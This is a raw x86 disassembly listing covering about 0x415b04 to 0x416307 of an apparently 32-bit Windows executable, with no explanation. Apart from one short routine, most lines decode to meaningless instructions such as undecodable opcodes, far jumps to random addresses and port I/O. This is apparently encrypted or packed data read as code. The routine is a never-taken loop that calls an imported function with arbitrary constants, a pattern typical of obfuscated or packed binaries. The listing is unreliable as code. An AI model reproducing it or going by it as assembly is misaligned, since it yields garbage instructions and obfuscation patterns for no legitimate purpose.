  415b04:	enter  0xa4d0,0xb5
  415b08:	out    dx,eax
  415b09:	push   0x51
  415b0b:	mov    bl,BYTE PTR [esi]
  415b0d:	inc    ebx
  415b0e:	jo     0x415ae4
  415b10:	aaa    
  415b11:	les    ecx,FWORD PTR [ecx-0x4]
  415b14:	cld    
  415b15:	fs scas al,BYTE PTR es:[edi]
  415b17:	cwde   
  415b18:	mov    al,0x1d
  415b1a:	fmul   DWORD PTR [esi-0x24]
  415b1d:	aad    0x29
  415b1f:	mov    ch,0x30
  415b21:	push   ebx
  415b22:	cmp    al,0xfd
  415b24:	clc    
  415b25:	stc    
  415b26:	test   al,0x10
  415b28:	(bad)  
  415b29:	mov    esi,0x1dc15656
  415b2e:	neg    DWORD PTR [esp+eax*4-0x158ad8c]
  415b35:	es sahf 
  415b37:	loop   0x415ac4
  415b39:	push   ebp
  415b3a:	or     al,0x33
  415b3c:	(bad)  
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0xc32318bc
  415bea:	xor    al,0xad
  415bec:	or     eax,0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx-0xb]
  415bf5:	jmp    0x415ba8
  415bf7:	(bad)  
  415bf8:	aad    0xb8
  415bfa:	cdq    
  415bfb:	scas   eax,DWORD PTR es:[edi]
  415bfc:	(bad)  
  415bfd:	cli    
  415bfe:	outs   dx,BYTE PTR ds:[esi]
  415bff:	cmp    ebx,ecx
  415c01:	push   esp
  415c02:	and    edx,DWORD PTR [esi+0x2c]
  415c05:	pop    edi
  415c06:	adc    al,BYTE PTR [eax]
  415c08:	or     ah,BYTE PTR [ecx-0x3f]
  415c0b:	popa   
  415c0c:	rol    DWORD PTR [ecx],1
  415c0e:	dec    ebx
  415c0f:	stos   DWORD PTR es:[edi],eax
  415c10:	sbb    al,0xed
  415c12:	push   ds
  415c13:	push   ebx
  415c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c15:	sbb    al,ah
  415c17:	cmp    edi,esp
  415c19:	lock jmp 0xa1a7:0xcbce72ac
  415c21:	lahf   
  415c22:	fcmovnb st,st(0)
  415c24:	push   ecx
  415c25:	cmp    eax,0x8fc6c52d
  415c2a:	xsha256 (bad)
  415c2b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415c2c:	aad    0xb0
  415c2e:	fst    QWORD PTR [edx+eax*8-0x72ea4073]
  415c35:	js     0x415c2a
  415c37:	clc    
  415c38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c39:	add    esi,esi
  415c3b:	mov    ebx,0x259b068f
  415c40:	loop   0x415bd0
  415c42:	sub    ebx,DWORD PTR [esi+0x72]
  415c45:	loope  0x415c6d
  415c47:	(bad)  
  415c48:	loope  0x415c9e
  415c4a:	into   
  415c4b:	add    BYTE PTR [ebp+0x4ccef7e3],cl
  415c51:	mov    eax,ds:0xe22c1f91
  415c56:	adc    DWORD PTR [eax+0x1ca5d740],0xbf1a092
  415c60:	(bad)  
  415c61:	jmp    0xf3463e78
  415c66:	push   esi
  415c67:	sahf   
  415c68:	arpl   WORD PTR [ebx+0x26],bx
  415c6b:	arpl   WORD PTR [edi+edi*2-0x1423ff3a],sp
  415c72:	push   es
  415c73:	xchg   esp,eax
  415c74:	xchg   esi,eax
  415c75:	mov    ebx,0xffdc1b8a
  415c7a:	ss jns 0x415cd5
  415c7d:	daa    
  415c7e:	fisttp DWORD PTR [ebx+0x2ab5b076]
  415c84:	ror    esi,cl
  415c86:	nop
  415c87:	(bad)
  415c8a:	push   ebx
  415c8b:	jo     0x415c7b
  415c8d:	xor    bh,dl
  415c8f:	push   ebx
  415c90:	pushf  
  415c91:	lds    ecx,FWORD PTR [edi-0x3320f9e7]
  415c97:	mov    cl,0xeb
  415c99:	mov    ebx,0x611a68d2
  415c9e:	inc    ch
  415ca0:	cmp    DWORD PTR [edx-0x25],esp
  415ca3:	xor    DWORD PTR ds:0x7ef4a9cd,0xdecfc91a
  415cad:	sub    ah,BYTE PTR [ebp-0x52]
  415cb0:	jb     0x415c5c
  415cb2:	or     eax,0xc6654b4b
  415cb7:	adc    eax,0x8cc1a1e3
  415cbc:	test   eax,0xd8488dce
  415cc1:	dec    esp
  415cc2:	dec    edx
  415cc3:	das    
  415cc4:	(bad)  
  415cc5:	dec    edi
  415cc6:	sbb    al,0x8a
  415cc8:	fbld   TBYTE PTR [esi]
  415cca:	jle    0x415cb6
  415ccc:	mov    ah,0x5d
  415cce:	shl    bh,1
  415cd0:	mov    al,0x7a
  415cd2:	xor    ecx,edi
  415cd4:	cli    
  415cd5:	scas   eax,DWORD PTR es:[edi]
  415cd6:	inc    ebx
  415cd7:	inc    ebp
  415cd8:	and    DWORD PTR [esi+edi*4],esp
  415cdb:	cli    
  415cdc:	(bad)  
  415cde:	add    ch,BYTE PTR [edx-0x7bc0cfaf]
  415ce4:	stos   BYTE PTR es:[edi],al
  415ce5:	mov    edi,0x9b8cf261
  415cea:	push   eax
  415ceb:	xchg   ebx,eax
  415cec:	or     al,BYTE PTR [ebp+eax*2+0x70]
  415cf0:	xor    ch,BYTE PTR [esi+0x51eca2de]
  415cf6:	sbb    al,0x47
  415cf8:	mov    ecx,0x5a91c64
  415cfd:	retf   
  415cfe:	mov    ch,ah
  415d00:	push   edx
  415d01:	mov    eax,ds:0x8cd9b09a
  415d06:	sub    BYTE PTR [ebp+0x56],dl
  415d09:	inc    ebp
  415d0a:	test   al,0xdd
  415d0c:	pop    esi
  415d0d:	imul   esp,DWORD PTR [eax],0x8c32c1c9
  415d13:	jp     0x415d8c
  415d15:	sti    
  415d16:	mov    eax,0xf304c49
  415d1b:	arpl   WORD PTR [ebx+0x57],cx
  415d1e:	cmp    dh,BYTE PTR [ebx-0x15b8f1d6]
  415d24:	adc    bl,cl
  415d26:	adc    ch,cl
  415d28:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d29:	mov    ah,0x4c
  415d2b:	fisttp DWORD PTR [edx]
  415d2d:	aas    
  415d2e:	jp     0x415d58
  415d30:	test   eax,0x59be86b9
  415d35:	mov    dh,0xe2
  415d37:	add    eax,0x6a313747
  415d3c:	data16 cld 
  415d3e:	sub    ch,al
  415d40:	inc    esi
  415d41:	(bad)
  415d44:	outs   dx,BYTE PTR ds:[esi]
  415d45:	frstor [eax+0x29]
  415d48:	mov    ah,0x3b
  415d4a:	mov    WORD PTR [edi+0x6fb7ef54],?
  415d50:	ficom  DWORD PTR [ebx]
  415d52:	jecxz  0x415ce8
  415d54:	frstor [edi]
  415d56:	bound  esp,QWORD PTR [ecx]
  415d58:	stos   DWORD PTR es:[edi],eax
  415d59:	xor    eax,0xa2ce6954
  415d5e:	cmp    al,0x8a
  415d60:	fisubr DWORD PTR [eax+eiz*8-0xe04f28d]
  415d67:	pusha  
  415d68:	test   al,0x2d
  415d6a:	inc    ebp
  415d6b:	scas   eax,DWORD PTR es:[edi]
  415d6c:	xchg   DWORD PTR [edi],ebx
  415d6e:	inc    esi
  415d6f:	jbe    0x415cfd
  415d71:	and    al,0x9
  415d73:	xchg   esi,eax
  415d74:	(bad)  
  415d75:	mov    cl,0x53
  415d77:	pop    edi
  415d78:	push   ebx
  415d79:	popa   
  415d7a:	add    DWORD PTR [edi],esp
  415d7c:	stos   DWORD PTR es:[edi],eax
  415d7d:	test   al,al
  415d7f:	mov    esp,0x791e2aaf
  415d84:	sub    edi,DWORD PTR [ecx+edi*4+0x43]
  415d88:	dec    esp
  415d89:	(bad)
  415d8e:	nop
  415d8f:	test   DWORD PTR [ecx-0x2d],esi
  415d92:	(bad)
  415d95:	mov    ah,0x4b
  415d97:	ror    eax,cl
  415d99:	cmp    dh,BYTE PTR [ebx-0x5d]
  415d9c:	pop    eax
  415d9d:	test   DWORD PTR [esi+0x74848882],edx
  415da3:	in     eax,0x2d
  415da5:	aas    
  415da6:	fs sub esp,ecx
  415da9:	push   cs
  415daa:	pop    edi
  415dab:	cli    
  415dac:	int    0x68
  415dae:	push   esp
  415daf:	shl    BYTE PTR [esi+eiz*8-0x33c71fe2],cl
  415db6:	or     al,BYTE PTR [edi-0x2f]
  415db9:	push   ss
  415dba:	mov    bl,0x9b
  415dbc:	or     ebx,DWORD PTR [ecx+ebx*8-0x78]
  415dc0:	or     BYTE PTR [edx-0x1f38f00a],cl
  415dc6:	jo     0x415d68
  415dc8:	adc    BYTE PTR [edx+0x68],al
  415dcb:	loopne 0x415de6
  415dcd:	lds    ebp,FWORD PTR [ecx-0x10]
  415dd0:	icebp  
  415dd1:	push   edx
  415dd2:	loopne 0x415dfa
  415dd4:	dec    edx
  415dd5:	add    al,0x8f
  415dd7:	jb     0x415e12
  415dd9:	lds    edi,FWORD PTR [edi+0x3d]
  415ddc:	adc    DWORD PTR fs:[bx],0x5cc937f1
  415de4:	ins    DWORD PTR es:[edi],dx
  415de5:	and    ecx,DWORD PTR [esi+0x7536139b]
  415deb:	pop    edx
  415dec:	aas    
  415ded:	or     al,0x3d
  415def:	add    BYTE PTR [edx+0x19cb908e],dl
  415df5:	mov    cl,0x9e
  415df7:	inc    ecx
  415df8:	shl    DWORD PTR [ebx],cl
  415dfa:	mov    ah,0xb6
  415dfc:	mov    esi,DWORD PTR [edx+ebx*2+0x2743413d]
  415e03:	push   ebp
  415e04:	test   al,0xa0
  415e06:	not    DWORD PTR [esi+0x76af4b42]
  415e0c:	xor    edi,edx
  415e0e:	mov    ebx,0x2178bb00
  415e13:	xchg   edx,eax
  415e14:	push   cs
  415e15:	cmp    DWORD PTR [edi-0x32],ecx
  415e18:	arpl   WORD PTR [ebx+0x37202c17],bp
  415e1e:	pop    ecx
  415e1f:	push   cs
  415e20:	and    al,BYTE PTR [ebp+0x24bb599c]
  415e26:	xor    ebx,edx
  415e28:	xchg   BYTE PTR [edi],bl
  415e2a:	adc    eax,0xda069b1d
  415e2f:	jae    0x415e11
  415e31:	ficom  WORD PTR [edx+0x740b8809]
  415e37:	or     al,0x8a
  415e39:	jno    0x415e30
  415e3b:	in     al,0x44
  415e3d:	ins    DWORD PTR es:[edi],dx
  415e3e:	in     eax,0xa3
  415e40:	ss jns 0x415e29
  415e43:	(bad)  
  415e44:	pop    eax
  415e45:	xor    edx,edi
  415e47:	or     al,0x9e
  415e49:	and    al,0xce
  415e4b:	(bad)  
  415e4c:	in     eax,0x30
  415e4e:	aas    
  415e4f:	jbe    0x415ec3
  415e51:	push   0xffffff87
  415e53:	ffreep st(0)
  415e55:	inc    ebx
  415e56:	cmp    al,0x87
  415e58:	pop    ebx
  415e59:	or     al,0xc3
  415e5b:	or     DWORD PTR [eax-0x46acd0e6],ebp
  415e61:	adc    al,0x7b
  415e63:	dec    eax
  415e64:	or     ah,BYTE PTR [ecx+0x57]
  415e67:	ret    
  415e68:	adc    eax,0x17b292ce
  415e6d:	pop    ebp
  415e6e:	sub    al,0x43
  415e70:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e71:	jp     0x415e0f
  415e73:	ja     0x415e66
  415e75:	push   0x2dc3a83d
  415e7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e7b:	mov    ds,WORD PTR [ecx+0x774e53d]
  415e81:	sbb    al,BYTE PTR [ebx-0xe58c39d]
  415e87:	sbb    al,0xb9
  415e89:	stos   DWORD PTR es:[edi],eax
  415e8a:	fs xor al,0x28
  415e8d:	push   cs
  415e8e:	mov    al,ds:0x8089835a
  415e93:	jnp    0x415e3d
  415e95:	ror    DWORD PTR [esi-0x1d],0x4c
  415e99:	xlat   BYTE PTR ds:[ebx]
  415e9a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e9b:	pop    es
  415e9c:	aas    
  415e9d:	test   al,0x12
  415e9f:	test   eax,0x3ab34580
  415ea4:	fwait
  415ea5:	loope  0x415e31
  415ea7:	mov    edx,0x776d8dac
  415eac:	push   0xffffff91
  415eae:	retf   
  415eaf:	pop    es
  415eb0:	mov    al,0x98
  415eb2:	mov    fs,ecx
  415eb4:	inc    esi
  415eb5:	retf   
  415eb6:	inc    ebp
  415eb7:	test   eax,0x24f9eec4
  415ebc:	or     BYTE PTR [eax-0x431aedd4],ch
  415ec2:	das    
  415ec3:	repz (bad) 
  415ec5:	mov    edi,0xb3f72602
  415eca:	retf   
  415ecb:	cld    
  415ecc:	stc    
  415ecd:	cmc    
  415ece:	mov    eax,ds:0xbc32314e
  415ed3:	cmc    
  415ed4:	sbb    BYTE PTR [eax+0x4b],dh
  415ed7:	(bad)
  415eda:	int3   
  415edb:	cmp    eax,0x2415eee3
  415ee0:	mov    dh,0xb8
  415ee2:	ror    BYTE PTR [ecx],cl
  415ee4:	sub    bl,0x25
  415ee7:	jno    0x415f25
  415ee9:	out    dx,eax
  415eea:	in     eax,dx
  415eeb:	xor    al,0xbe
  415eed:	jne    0x415f13
  415eef:	aaa    
  415ef0:	rcl    BYTE PTR [ecx+edx*2+0x20e8aa87],0xb0
  415ef8:	inc    edx
  415ef9:	sti    
  415efa:	in     eax,0x27
  415efc:	in     eax,0xee
  415efe:	shl    BYTE PTR [edx+0x63],1
  415f01:	and    ebx,DWORD PTR [esi]
  415f03:	imul   ebx,ebp,0xffffffef
  415f06:	xor    bh,bl
  415f08:	fcomi  st,st(6)
  415f0a:	dec    esi
  415f0b:	ins    BYTE PTR es:[edi],dx
  415f0c:	in     al,0x81
  415f0e:	mov    ds:0x186a9a3e,al
  415f13:	add    BYTE PTR [esi+0x6e89bd9a],0x68
  415f1a:	popa   
  415f1b:	call   0x98c3:0xe9e10460
  415f22:	mov    dh,0xa6
  415f24:	ret    0x27ef
  415f27:	repnz (bad) 
  415f29:	stos   BYTE PTR es:[edi],al
  415f2a:	pop    ebp
  415f2b:	sub    al,BYTE PTR [edx+0x70]
  415f2e:	in     eax,dx
  415f2f:	adc    al,0xa
  415f31:	arpl   WORD PTR [edi-0x609bb627],dx
  415f37:	outs   dx,BYTE PTR ds:[esi]
  415f38:	stos   DWORD PTR es:[edi],eax
  415f39:	sub    ecx,DWORD PTR [ebp-0x4]
  415f3c:	mov    ds:0x3874afa,al
  415f41:	mov    ch,0xe4
  415f43:	dec    eax
  415f44:	jnp    0x415f66
  415f46:	mov    esi,0x16a5596f
  415f4b:	sub    edx,DWORD PTR [edx+0x41]
  415f4e:	jo     0x415f5c
  415f50:	pushf  
  415f51:	dec    esp
  415f52:	cmc    
  415f53:	(bad)  
  415f54:	lods   eax,DWORD PTR ds:[esi]
  415f55:	ret    
  415f56:	push   esi
  415f57:	int3   
  415f58:	std    
  415f59:	mov    DWORD PTR [ecx+0x14949f76],edx
  415f5f:	mov    dh,0x2d
  415f61:	jae    0x415f55
  415f63:	add    ecx,DWORD PTR [edi-0x225d2090]
  415f69:	retf   
  415f6a:	test   bl,ah
  415f6c:	xchg   BYTE PTR [edx+ebp*4+0x48],dl
  415f70:	ds push cs
  415f72:	outs   dx,DWORD PTR ds:[esi]
  415f73:	cmp    DWORD PTR [esi-0x1],ebp
  415f76:	or     ebp,ebp
  415f78:	stos   DWORD PTR es:[edi],eax
  415f79:	outs   dx,DWORD PTR ds:[esi]
  415f7a:	xchg   edi,eax
  415f7b:	mov    ecx,ss
  415f7d:	jle    0x415fdf
  415f7f:	addr16 xchg ebx,eax
  415f81:	adc    bl,bh
  415f83:	xor    DWORD PTR [edi-0x41],ecx
  415f86:	sbb    eax,0x30d7a65f
  415f8b:	ret    0xf0b3
  415f8e:	xor    DWORD PTR [esi+0x7c],0xffffff9f
  415f92:	mov    ?,WORD PTR [esi]
  415f94:	test   ebp,esp
  415f96:	ds cmp eax,0x4de7b218
  415f9c:	mov    ds:0x1f4c97b2,eax
  415fa1:	inc    esp
  415fa2:	xchg   ecx,eax
  415fa3:	ret    
  415fa4:	out    0xfa,eax
  415fa6:	mov    ebx,DWORD PTR [ecx-0x593ccad7]
  415fac:	loope  0x415f52
  415fae:	(bad)  
  415faf:	pop    esp
  415fb0:	mov    WORD PTR [ebx-0x19921742],ss
  415fb6:	loope  0x415fac
  415fb8:	cmp    al,0xaa
  415fba:	push   ecx
  415fbb:	adc    DWORD PTR [edx-0x3f],0x88046d9f
  415fc2:	push   edi
  415fc4:	clc    
  415fc5:	add    eax,0xbf7a9d0d
  415fca:	test   eax,0xf2e9a9f6
  415fcf:	clc    
  415fd0:	je     0x415f78
  415fd2:	pop    ebx
  415fd3:	push   0x73
  415fd5:	rol    BYTE PTR [edx-0x7d093d8],0xc0
  415fdc:	and    edx,edx
  415fde:	adc    DWORD PTR [edx+esi*8-0x395718ac],ebp
  415fe5:	xchg   ebx,eax
  415fe6:	(bad)
  415fe9:	test   al,0x98
  415feb:	int3   
  415fec:	mov    esi,0x54f59110
  415ff1:	jae    0x416026
  415ff3:	fnstsw WORD PTR [edx-0x4ff484fb]
  415ff9:	ror    DWORD PTR [edi-0x38],0x0
  415ffd:	(bad)  [ebx-0x77dd3363]
  416003:	mov    dl,0x6c
  416005:	mov    esp,0x42d575cb
  41600a:	mov    edi,0x4f06a991
  41600f:	push   0xe45d73e6
  416014:	mov    esp,0xa439eef
  416019:	pop    es
  41601a:	scas   eax,DWORD PTR es:[edi]
  41601b:	arpl   WORD PTR ds:0x28110c5a,di
  416021:	in     al,dx
  416022:	mov    esp,esp
  416024:	cmp    DWORD PTR [esi+edx*1-0x7ed6485a],ebx
  41602b:	repz shr DWORD PTR [ebx+0x18],1
  41602f:	data16 cmp al,0x31
  416032:	sbb    esi,DWORD PTR ds:0x734314c8
  416038:	sub    bl,BYTE PTR [edi-0x24]
  41603b:	das    
  41603c:	clc    
  41603d:	mov    dh,0xd2
  41603f:	std    
  416040:	push   eax
  416041:	cld    
  416042:	mov    ecx,0x2faeb1fb
  416047:	push   es
  416048:	jo     0x416050
  41604a:	xchg   ebp,eax
  41604b:	adc    al,0x4c
  41604d:	scas   eax,DWORD PTR es:[edi]
  41604e:	and    al,0x42
  416050:	clc    
  416051:	inc    ebp
  416052:	dec    esp
  416053:	jmp    0xebb40e0e
  416058:	cdq    
  416059:	add    eax,0x37c658d6
  41605e:	cs sti 
  416060:	xor    ch,BYTE PTR [eax+edx*8+0x1d4a9bfe]
  416067:	and    eax,0x6aca7c0f
  41606c:	mov    bl,0x47
  41606e:	jmp    0x416022
  416070:	lods   al,BYTE PTR ds:[esi]
  416071:	and    ebx,DWORD PTR [ecx+ecx*8+0x69]
  416075:	int3   
  416076:	ror    DWORD PTR [ebp+edi*4+0x45],1
  41607a:	pop    esp
  41607b:	or     al,0xe0
  41607d:	jge    0x41605a
  41607f:	push   ds
  416080:	mov    ss,WORD PTR [esi]
  416082:	addr16 mov eax,0x31279592
  416088:	xor    BYTE PTR [edx+0x20],ch
  41608b:	jmp    0x4160d8
  41608d:	adc    edx,ebp
  41608f:	clc    
  416090:	ret    0x5c64
  416093:	mov    ch,0x69
  416095:	or     eax,0x67dd4f8a
  41609a:	jo     0x41605d
  41609c:	fisubr WORD PTR [ecx-0x6e]
  41609f:	aaa    
  4160a0:	dec    esi
  4160a1:	jns    0x4160ee
  4160a3:	aaa    
  4160a4:	cmp    BYTE PTR [esi],0xe4
  4160a7:	push   ds
  4160a8:	lahf   
  4160a9:	xchg   ebp,eax
  4160aa:	adc    bh,ah
  4160ac:	icebp  
  4160ad:	test   BYTE PTR [ecx],dl
  4160af:	fs in  eax,dx
  4160b1:	scas   eax,DWORD PTR es:[edi]
  4160b2:	bound  eax,QWORD PTR [ecx]
  4160b4:	int3   
  4160b5:	ret    0x7cad
  4160b8:	rcr    edx,cl
  4160ba:	mov    esi,0x8b94899a
  4160bf:	add    eax,0x86d06eb0
  4160c4:	lock sub al,0x94
  4160c7:	mov    eax,ds:0xc32e0466
  4160cc:	and    eax,0x1498437a
  4160d1:	and    edx,edx
  4160d3:	mov    esi,0x5e0d8065
  4160d8:	test   DWORD PTR [ebp-0x9],edx
  4160db:	sub    BYTE PTR [edx+0x44672d4d],al
  4160e1:	pmullw mm4,QWORD PTR [eiz*4-0x633c585a]
  4160e9:	push   cs
  4160ea:	pop    esi
  4160eb:	jno    0x416123
  4160ed:	or     edi,esi
  4160ef:	mov    BYTE PTR [ebx+0xa43db2f],ah
  4160f5:	sbb    dl,ch
  4160f7:	jno    0x4160d0
  4160f9:	jno    0x4160a9
  4160fb:	ss xor ebx,ecx
  4160fe:	xchg   ebp,eax
  4160ff:	shr    edx,1
  416101:	fisttp DWORD PTR [edx-0x2e]
  416104:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416105:	test   eax,0xcb557ed2
  41610a:	mov    eax,ds:0x2615dbcf
  41610f:	mov    esi,ds
  416111:	jne    0x416172
  416113:	cld    
  416114:	jae    0x416131
  416116:	addr16 test eax,0x90a4c915
  41611c:	aas    
  41611d:	test   al,0x7c
  41611f:	xchg   ecx,eax
  416120:	mov    ds,WORD PTR [edx]
  416122:	xlat   BYTE PTR ds:[ebx]
  416123:	scas   al,BYTE PTR es:[edi]
  416124:	rcr    DWORD PTR [edi+ebx*8+0x3e],cl
  416128:	jnp    0x41613a
  41612a:	inc    ebp
  41612b:	push   edx
  41612c:	mov    ds:0x956bf8bc,eax
  416131:	xor    esp,DWORD PTR [edi]
  416133:	pop    ebp
  416134:	fstp   QWORD PTR [ebp+0x1c]
  416137:	push   cs
  416138:	loop   0x4160eb
  41613a:	add    ebp,DWORD PTR [ebx+0x4f]
  41613d:	jno    0x416196
  41613f:	inc    ebp
  416140:	inc    edi
  416141:	scas   al,BYTE PTR es:[edi]
  416142:	xchg   edi,eax
  416143:	mov    eax,ds:0x80c79a56
  416148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416149:	or     al,0x55
  41614b:	aas    
  41614c:	stos   BYTE PTR es:[edi],al
  41614d:	dec    edx
  41614e:	data16 sar BYTE PTR [ebp-0x5534b7a4],1
  416155:	fs ffreep st(0)
  416158:	add    eax,0x7a8b9db8
  41615d:	inc    edx
  41615e:	in     al,dx
  41615f:	and    edx,DWORD PTR [ebx-0x32]
  416162:	loop   0x416164
  416164:	sbb    dl,dl
  416166:	mov    ?,dx
  416169:	in     eax,0xe8
  41616b:	xchg   esp,eax
  41616c:	loop   0x41614c
  41616e:	les    esp,FWORD PTR [esi-0x7d]
  416171:	(bad)  
  416172:	xchg   edx,eax
  416173:	lahf   
  416174:	sbb    esi,DWORD PTR [edx]
  416176:	mov    al,0x13
  416178:	and    eax,DWORD PTR [ebx+eax*8+0x51]
  41617c:	lods   al,BYTE PTR ds:[esi]
  41617d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41617e:	fs fs fs shl ecx,0x88
  416184:	xor    BYTE PTR [ebx],0xac
  416187:	test   al,0xd
  416189:	xchg   esp,eax
  41618a:	out    0x79,eax
  41618c:	clc    
  41618d:	jmp    0x41617e
  41618f:	into   
  416190:	ret    0x3d11
  416193:	jl     0x4161c5
  416195:	fwait
  416196:	cmp    eax,0x55e1693b
  41619b:	repz mov eax,0xc968ac68
  4161a1:	mov    al,ds:0xc6fd9dbf
  4161a6:	xor    ebx,edi
  4161a8:	sub    al,0xc2
  4161aa:	(bad)  
  4161ab:	out    0x16,al
  4161ad:	push   edx
  4161ae:	mov    bl,0xe6
  4161b0:	mov    ebp,0x69cb7482
  4161b5:	jmp    0xb29d:0x4aa50642
  4161bc:	jmp    0x4f8f:0x3fae8540
  4161c3:	sbb    BYTE PTR [eax-0x17],dl
  4161c6:	jbe    0x4161c2
  4161c8:	dec    ebp
  4161c9:	sub    eax,0x36e1f41f
  4161ce:	xchg   ebx,eax
  4161cf:	scas   al,BYTE PTR es:[edi]
  4161d0:	aaa    
  4161d1:	jmp    0x21404872
  4161d6:	into   
  4161d7:	adc    BYTE PTR [ebp+0x3a],0x76
  4161db:	push   cs
  4161dc:	jge    0x416186
  4161de:	mov    BYTE PTR [edi+0x52],bh
  4161e1:	mov    edx,0xa00a0bde
  4161e6:	jecxz  0x41619d
  4161e8:	sbb    BYTE PTR [ebx-0x6b],cl
  4161eb:	adc    BYTE PTR [edx],ch
  4161ed:	(bad)  
  4161ee:	loopne 0x416175
  4161f0:	mov    bh,0xcc
  4161f2:	cwde   
  4161f3:	out    0xc5,eax
  4161f5:	inc    BYTE PTR [eax-0x1f]
  4161f8:	imul   ecx,DWORD PTR [edi-0x922e1de],0xffffffff
  4161ff:	loop   0x416268
  416201:	push   0x24dd9d25
  416206:	add    dh,ah
  416208:	xchg   esp,eax
  416209:	lock jb 0x41623d
  41620c:	mov    ds:0xfe980649,eax
  416211:	or     DWORD PTR [eax+0x35912c8b],ebx
  416217:	mov    BYTE PTR [edx-0x31],ah
  41621a:	jmp    0x1c182786
  41621f:	mov    dl,0x8d
  416221:	adc    eax,0xb393881c
  416226:	jno    0x4161dc
  416228:	int    0x7b
  41622a:	sub    BYTE PTR [esi],0x4e
  41622d:	mov    eax,0xc508615
  416232:	fisttp QWORD PTR [ebx]
  416234:	jecxz  0x4161d0
  416236:	sub    BYTE PTR [edx+0x76],cl
  416239:	lock int 0x8d
  41623c:	mov    dh,0x5d
  41623e:	jns    0x4161ef
  416240:	test   DWORD PTR [ebx],eax
  416242:	mov    ah,0x80
  416244:	xor    DWORD PTR [edi],edi
  416246:	into   
  416247:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416248:	je     0x416298
  41624a:	enter  0x6250,0x98
  41624e:	pop    ebp
  41624f:	jg     0x416202
  416251:	test   al,0x1
  416253:	sti    
  416254:	pop    esi
  416255:	and    eax,0x54b6cd91
  41625a:	mov    dh,0xd9
  41625c:	add    DWORD PTR [ebx+0x5b3ba3c7],ebp
  416262:	cli    
  416263:	mov    eax,ds:0xc9f78e0e
  416268:	pop    eax
  416269:	shl    BYTE PTR [edx],cl
  41626b:	pmuludq mm5,QWORD PTR [eax+eiz*4-0x72]
  416270:	aam    0xff
  416272:	cmp    eax,0x63c5e7aa
  416277:	jle    0x416216
  416279:	cmp    BYTE PTR [ecx+0x18],bl
  41627c:	js     0x4162b2
  41627e:	fwait
  41627f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416280:	jno    0x4162d3
  416282:	pop    edi
  416283:	xchg   edx,eax
  416284:	add    al,0x31
  416286:	ja     0x4162fd
  416288:	out    dx,eax
  416289:	mov    WORD PTR ds:0xf841ff66,fs
  41628f:	(bad)  
  416290:	jae    0x416264
  416292:	mov    ecx,0x67f583de
  416297:	jecxz  0x41623e
  416299:	sahf   
  41629a:	xor    ecx,DWORD PTR ds:0xd36354b4
  4162a0:	sbb    BYTE PTR [ebp-0x5e],ah
  4162a3:	and    BYTE PTR [eax-0x62b55cb9],ah
  4162a9:	retf   0xf3a2
  4162ac:	sbb    DWORD PTR [ebx+0x3d],ebp
  4162af:	pop    edi
  4162b0:	add    eax,0xd7ce16e
  4162b5:	(bad)  
  4162b6:	mov    bl,0x51
  4162b8:	xor    bl,BYTE PTR [ebp-0x1913992a]
  4162be:	adc    al,0xc0
  4162c0:	shr    bl,0xdf
  4162c3:	pop    esp
  4162c4:	xchg   edi,eax
  4162c5:	jne    0x416267
  4162c7:	leave  
  4162c8:	shr    ebp,cl
  4162ca:	mov    dh,BYTE PTR [esi-0x551fb78]
  4162d0:	dec    esi
  4162d2:	jg     0x4162c9
  4162d4:	sub    esp,DWORD PTR [esi-0x21]
  4162d7:	in     eax,dx
  4162d8:	fisttp QWORD PTR [esi-0x44c96b18]
  4162de:	push   ebp
  4162df:	pop    esp
  4162e0:	ins    DWORD PTR es:[edi],dx
  4162e1:	dec    esp
  4162e2:	std    
  4162e3:	mov    ss,eax
  4162e5:	xor    DWORD PTR [eax+0x21],0x87d2491a
  4162ec:	aad    0x95
  4162ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4162ef:	jmp    0x251a:0xdc6a8425
  4162f6:	dec    esp
  4162f7:	out    0x1b,al
  4162f9:	clc    
  4162fa:	ds or  bl,0xb8
  4162fe:	push   ss
  4162ff:	call   0x296b:0xab221bf7
  416306:	pop    ss
  416307:	or     ebp,DWORD PTR [edi+0x5b]
